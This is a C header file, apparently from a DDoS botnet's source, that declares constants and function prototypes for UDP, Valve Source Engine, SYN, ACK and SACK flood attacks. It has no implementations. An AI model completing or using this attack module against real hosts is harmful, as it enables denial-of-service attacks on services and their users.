#ifndef ATTACK_H
#define ATTACK_H

#include <stdint.h>
#include <netinet/in.h>

// Attack Vectors
// Attack Vectors
#define ATK_UDP_VSE    1  // Valve Source Engine
#define ATK_TCP_SOCKET 2  // Socket Bypass (3-way handshake)
#define ATK_TCP_SACK   3  // Advanced SACK Flood
#define ATK_TCP_WRA    4  // Window Randomization
#define ATK_UDP_PLAIN  5  // Generic UDP Flood (PPS/Volumetric)
#define ATK_TCP_SYN    6  // SYN Flood
#define ATK_TCP_ACK    7  // ACK Flood

struct attack_target {
    struct sockaddr_in dest_addr;
    uint32_t duration;
    uint8_t flags;
};

// Prototypes
void attack_init(void);
void attack_start(int type, uint32_t ip, uint16_t port, uint32_t duration);

// Internal Implementations
void attack_udp_vse(uint32_t ip, uint16_t port, uint32_t duration);
void attack_socket(uint32_t ip, uint16_t port, uint32_t duration);
void attack_tcp_sack(uint32_t ip, uint16_t port, uint32_t duration);
void attack_udp_plain(uint32_t ip, uint16_t port, uint32_t duration);
void attack_tcp_syn(uint32_t ip, uint16_t port, uint32_t duration);
void attack_tcp_ack(uint32_t ip, uint16_t port, uint32_t duration);

#endif
